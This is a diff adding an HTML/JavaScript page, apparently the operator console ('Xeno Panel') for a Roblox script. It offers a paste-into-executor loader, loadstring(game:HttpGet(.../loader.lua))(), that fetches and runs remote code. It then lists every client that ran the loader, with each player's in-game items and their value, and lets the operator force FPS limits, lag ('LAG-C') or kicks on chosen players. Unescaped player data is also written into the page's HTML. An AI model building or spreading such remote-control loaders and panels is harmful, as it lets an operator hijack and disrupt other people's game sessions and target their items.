@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>Xeno Panel</title>
+    <style>
+        /* same styles as before – no changes needed */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', -apple-system, sans-serif; background: #0b0d11; color: #e8edf5; min-height: 100vh; padding: 16px; display: flex; justify-content: center; }
+        /* ... rest of CSS unchanged ... */
+        .toggle-wrap { /* ... */ }
+    </style>
+</head>
+<body>
+<div class="toast" id="toast"></div>
+<div class="loader-modal-overlay" id="loaderModal">
+    <div class="loader-modal">
+        <h3>Copy Loader</h3>
+        <p class="sub">Paste this into any executor.</p>
+        <div class="code-block" id="loaderCodeBlock">
+            <span class="copy-hint">click to copy</span>
+            <span id="loaderCodeText"></span>
+        </div>
+        <div class="modal-actions">
+            <button class="btn" onclick="closeLoaderModal()">Close</button>
+            <button class="btn btn-primary" id="copyLoaderBtn">Copy</button>
+        </div>
+    </div>
+</div>
+
+<div class="app">
+    <header class="header">
+        <div class="header-left">
+            <span class="logo">Xeno Panel</span>
+            <span class="logo-sub">v3</span>
+        </div>
+        <div class="header-actions">
+            <button class="copy-loader-btn" onclick="openLoaderModal()">
+                <span class="icon">📋</span> Copy loader
+            </button>
+            <div class="header-stats">
+                <span>🟢 <span class="num" id="onlineCount">0</span> online</span>
+                <span>⏱ <span class="num" id="refreshTimer">1s</span></span>
+            </div>
+        </div>
+    </header>
+
+    <div class="main">
+        <section class="players-section">
+            <div class="section-header">
+                <h2>👥 Players <span class="badge" id="totalBadge">0</span></h2>
+                <span class="last-update" id="lastUpdate">updating…</span>
+            </div>
+            <div class="search-bar">
+                <input type="text" id="searchInput" placeholder="Search by username, display name, or brainrot..." />
+            </div>
+            <div class="player-grid" id="playerGrid">
+                <div class="empty-state">
+                    <div class="icon">📡</div>
+                    <p>Waiting for clients…</p>
+                    <p class="sub">Execute the loader script to see players appear.</p>
+                </div>
+            </div>
+        </section>
+
+        <aside class="command-panel" id="commandPanel">
+            <div class="panel-title">🎮 Control <span class="target-name" id="targetName">—</span></div>
+            <div class="panel-sub"><span id="targetStatus">No player selected</span></div>
+
+            <div class="cmd-group">
+                <span class="cmd-label">Performance</span>
+                <div class="cmd-row">
+                    <div class="toggle-wrap disabled" id="toggleFps" data-cmd="fps_limit">
+                        <span class="label">FPS Limit</span>
+                        <div class="toggle-track"><span class="thumb"></span></div>
+                        <span class="status-text">OFF</span>
+                    </div>
+                    <div class="toggle-wrap disabled" id="toggleLagC" data-cmd="lag_c">
+                        <span class="label">LAG-C</span>
+                        <div class="toggle-track"><span class="thumb"></span></div>
+                        <span class="status-text">OFF</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <span class="cmd-label">Visuals</span>
+                <div class="cmd-row">
+                    <div class="toggle-wrap disabled" id="toggleEle" data-cmd="ele_visual">
+                        <span class="label">Ele Visual</span>
+                        <div class="toggle-track"><span class="thumb"></span></div>
+                        <span class="status-text">OFF</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <span class="cmd-label">Actions</span>
+                <div class="cmd-btn-group">
+                    <button class="cmd-btn danger" id="btnKick" disabled>Kick</button>
+                </div>
+            </div>
+
+            <div class="brainrot-section" id="brainrotSection">
+                <div class="brainrot-label">
+                    <span>🧠 BRAINROTS</span>
+                    <span class="count" id="brainrotCount">0 items</span>
+                </div>
+                <div class="brainrot-list" id="brainrotList">
+                    <div class="brainrot-empty">Select a player to see brainrots</div>
+                </div>
+            </div>
+        </aside>
+    </div>
+</div>
+
+<script>
+    const API_BASE = window.location.origin;
+    const POLL_INTERVAL = 1000;
+
+    let players = new Map();
+    let selectedUserId = null;
+    let commandState = { fps_limit: false, lag_c: false, ele_visual: false };
+    let toastTimeout = null;
+    let searchQuery = '';
+
+    const $ = (s) => document.querySelector(s);
+    const $$ = (s) => document.querySelectorAll(s);
+
+    const playerGrid = $('#playerGrid');
+    const onlineCount = $('#onlineCount');
+    const totalBadge = $('#totalBadge');
+    const lastUpdate = $('#lastUpdate');
+    const refreshTimer = $('#refreshTimer');
+    const targetName = $('#targetName');
+    const targetStatus = $('#targetStatus');
+    const toggleFps = $('#toggleFps');
+    const toggleLagC = $('#toggleLagC');
+    const toggleEle = $('#toggleEle');
+    const btnKick = $('#btnKick');
+    const brainrotList = $('#brainrotList');
+    const brainrotCount = $('#brainrotCount');
+    const toast = $('#toast');
+    const searchInput = $('#searchInput');
+
+    function showToast(msg, icon = '✓') {
+        if (toastTimeout) clearTimeout(toastTimeout);
+        toast.innerHTML = `<span class="toast-icon">${icon}</span> ${msg}`;
+        toast.classList.add('show');
+        toastTimeout = setTimeout(() => toast.classList.remove('show'), 2800);
+    }
+
+    function openLoaderModal() {
+        const modal = $('#loaderModal');
+        const loaderUrl = API_BASE + '/loader.lua';
+        document.getElementById('loaderCodeText').textContent = `loadstring(game:HttpGet("${loaderUrl}"))()`;
+        modal.classList.add('open');
+    }
+    function closeLoaderModal() { $('#loaderModal').classList.remove('open'); }
+    $('#loaderModal').addEventListener('click', function(e) { if (e.target === this) closeLoaderModal(); });
+    $('#copyLoaderBtn').addEventListener('click', function() {
+        const text = document.getElementById('loaderCodeText').textContent;
+        navigator.clipboard.writeText(text).then(() => {
+            showToast('Loader code copied!', '📋');
+            closeLoaderModal();
+        }).catch(() => {
+            const range = document.createRange();
+            const sel = window.getSelection();
+            const el = document.getElementById('loaderCodeText');
+            range.selectNodeContents(el);
+            sel.removeAllRanges();
+            sel.addRange(range);
+            document.execCommand('copy');
+            showToast('Loader code copied!', '📋');
+            closeLoaderModal();
+        });
+    });
+    document.getElementById('loaderCodeBlock').addEventListener('click', function() {
+        document.getElementById('copyLoaderBtn').click();
+    });
+
+    async function fetchPlayers() {
+        try {
+            const res = await fetch(API_BASE + '/api/players');
+            if (!res.ok) throw new Error('Server error');
+            const data = await res.json();
+            return data.players || [];
+        } catch (e) { return []; }
+    }
+
+    async function sendCommand(userId, payload) {
+        try {
+            const res = await fetch(API_BASE + '/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId, ...payload })
+            });
+            if (!res.ok) throw new Error('Command failed');
+            return await res.json();
+        } catch (e) {
+            showToast('Command failed: ' + e.message, '✗');
+            return null;
+        }
+    }
+
+    function renderPlayers() {
+        const entries = Array.from(players.values());
+        let filtered = entries;
+        if (searchQuery.trim() !== '') {
+            const q = searchQuery.trim().toLowerCase();
+            filtered = entries.filter(p => {
+                const matchUsername = p.username && p.username.toLowerCase().includes(q);
+                const matchDisplay = p.display_name && p.display_name.toLowerCase().includes(q);
+                const matchBrainrot = p.brainrots && p.brainrots.some(b => b.title && b.title.toLowerCase().includes(q));
+                return matchUsername || matchDisplay || matchBrainrot;
+            });
+        }
+
+        const online = filtered.filter(p => p.online);
+        const offline = filtered.filter(p => !p.online);
+
+        onlineCount.textContent = online.length;
+        totalBadge.textContent = entries.length;
+
+        if (filtered.length === 0) {
+            playerGrid.innerHTML = `<div class="empty-state"><div class="icon">🔍</div><p>No players match your search</p><p class="sub">Try a different keyword</p></div>`;
+            return;
+        }
+
+        const sorted = [...online, ...offline];
+        let html = '';
+        for (const p of sorted) {
+            const isSelected = (p.user_id === selectedUserId);
+            const statusClass = p.online ? 'online' : 'offline';
+            const avatarUrl = p.avatar_url || '';
+            const initial = (p.username || '?')[0].toUpperCase();
+            html += `<div class="player-card ${statusClass} ${isSelected ? 'selected' : ''}" data-userid="${p.user_id}" onclick="selectPlayer('${p.user_id}')">
+                <div class="player-avatar">${avatarUrl ? `<img src="${avatarUrl}" alt="${p.username}" loading="lazy" onerror="this.style.display='none'" />` : ''}<div class="fallback" style="${avatarUrl ? 'display:none' : ''}">${initial}</div></div>
+                <div class="player-info"><div class="player-name">${p.username || 'Unknown'}</div><div class="player-meta"><span class="tag">${p.executor || '?'}</span><span class="tag">${p.game_name ? p.game_name.substring(0, 14) : '?'}</span></div></div>
+                <div class="player-status ${p.online ? '' : 'offline'}"></div>
+            </div>`;
+        }
+        playerGrid.innerHTML = html;
+        updateCommandPanel();
+    }
+
+    function updateCommandPanel() {
+        const selected = selectedUserId ? players.get(selectedUserId) : null;
+        if (selected && selected.online) {
+            targetName.textContent = selected.username || 'Player';
+            targetStatus.textContent = '🟢 Online · ' + (selected.executor || 'unknown');
+            targetStatus.style.color = '#86efac';
+            toggleFps.classList.remove('disabled');
+            toggleLagC.classList.remove('disabled');
+            toggleEle.classList.remove('disabled');
+            btnKick.disabled = false;
+            setToggleState(toggleFps, commandState.fps_limit || false);
+            setToggleState(toggleLagC, commandState.lag_c || false);
+            setToggleState(toggleEle, commandState.ele_visual || false);
+            renderBrainrots(selected.brainrots || []);
+        } else if (selected && !selected.online) {
+            targetName.textContent = selected.username || 'Player';
+            targetStatus.textContent = '⛔ Offline';
+            targetStatus.style.color = '#6b7a8f';
+            toggleFps.classList.add('disabled');
+            toggleLagC.classList.add('disabled');
+            toggleEle.classList.add('disabled');
+            btnKick.disabled = true;
+            renderBrainrots(selected.brainrots || []);
+        } else {
+            targetName.textContent = '—';
+            targetStatus.textContent = 'No player selected';
+            targetStatus.style.color = '#6b7a8f';
+            toggleFps.classList.add('disabled');
+            toggleLagC.classList.add('disabled');
+            toggleEle.classList.add('disabled');
+            btnKick.disabled = true;
+            renderBrainrots([]);
+        }
+    }
+
+    function setToggleState(el, active) {
+        if (active) {
+            el.classList.add('active');
+            el.querySelector('.status-text').textContent = 'ON';
+        } else {
+            el.classList.remove('active');
+            el.querySelector('.status-text').textContent = 'OFF';
+        }
+    }
+
+    function renderBrainrots(brainrots) {
+        brainrotCount.textContent = (brainrots.length || 0) + ' items';
+        if (!brainrots || brainrots.length === 0) {
+            brainrotList.innerHTML = `<div class="brainrot-empty">No brainrots found</div>`;
+            return;
+        }
+        let html = '';
+        for (const b of brainrots) {
+            html += `<div class="brainrot-item"><span class="title">${b.title || 'Unknown'}</span><span class="cash">${b.cash || '?'}</span></div>`;
+        }
+        brainrotList.innerHTML = html;
+    }
+
+    function selectPlayer(userId) {
+        selectedUserId = userId;
+        fetchPlayerCommandState(userId);
+        renderPlayers();
+        updateCommandPanel();
+    }
+
+    async function fetchPlayerCommandState(userId) {
+        try {
+            const res = await fetch(API_BASE + '/api/command_state?user_id=' + encodeURIComponent(userId));
+            if (!res.ok) return;
+            const data = await res.json();
+            if (data) {
+                commandState.fps_limit = data.fps_limit || false;
+                commandState.lag_c = data.lag_c || false;
+                commandState.ele_visual = data.ele_visual || false;
+                updateCommandPanel();
+            }
+        } catch (e) { /* ignore */ }
+    }
+
+    function setupToggle(el, cmdKey) {
+        el.addEventListener('click', function(e) {
+            if (this.classList.contains('disabled')) return;
+            if (!selectedUserId) { showToast('Select a player first', '⚠️'); return; }
+            const player = players.get(selectedUserId);
+            if (!player || !player.online) { showToast('Player is offline', '⚠️'); return; }
+            const current = commandState[cmdKey] || false;
+            const newState = !current;
+            commandState[cmdKey] = newState;
+            setToggleState(this, newState);
+            const payload = {};
+            payload[cmdKey] = newState;
+            sendCommand(selectedUserId, payload).then(() => {
+                showToast(`${cmdKey} → ${newState ? 'ON' : 'OFF'}`, '✓');
+            }).catch(() => {
+                commandState[cmdKey] = current;
+                setToggleState(this, current);
+            });
+        });
+    }
+
+    setupToggle(toggleFps, 'fps_limit');
+    setupToggle(toggleLagC, 'lag_c');
+    setupToggle(toggleEle, 'ele_visual');
+
+    btnKick.addEventListener('click', function() {
+        if (this.disabled) return;
+        if (!selectedUserId) { showToast('Select a player', '⚠️'); return; }
+        const player = players.get(selectedUserId);
+        if (!player || !player.online) { showToast('Player offline', '⚠️'); return; }
+        if (!confirm(`Kick ${player.username || 'player'}?`)) return;
+        sendCommand(selectedUserId, { kick: true }).then(() => showToast(`Kicked ${player.username}`, '🚪'));
+    });
+
+    let pollCount = 0;
+
+    async function poll() {
+        const data = await fetchPlayers();
+        const newMap = new Map();
+        for (const p of data) {
+            const online = (Date.now() - (p.lastHeartbeat || 0)) < 15000;
+            p.online = online;
+            if (players.has(p.user_id)) {
+                const old = players.get(p.user_id);
+                p._cmdState = old._cmdState || {};
+            } else {
+                p._cmdState = { fps_limit: false, lag_c: false, ele_visual: false };
+            }
+            newMap.set(p.user_id, p);
+        }
+        players = newMap;
+        if (selectedUserId && !players.has(selectedUserId)) {
+            selectedUserId = null;
+        }
+        renderPlayers();
+        updateCommandPanel();
+        const now = new Date();
+        lastUpdate.textContent = 'updated ' + now.toLocaleTimeString();
+        refreshTimer.textContent = (pollCount + 1) + 's';
+        pollCount = (pollCount + 1) % 999;
+    }
+
+    searchInput.addEventListener('input', function() {
+        searchQuery = this.value;
+        renderPlayers();
+    });
+
+    poll();
+    setInterval(poll, POLL_INTERVAL);
+    document.addEventListener('visibilitychange', () => { if (!document.hidden) poll(); });
+
+    setTimeout(() => {
+        if (!selectedUserId) {
+            const first = Array.from(players.values()).find(p => p.online);
+            if (first) selectPlayer(first.user_id);
+        }
+    }, 2000);
+</script>
+
+</body>
+</html>
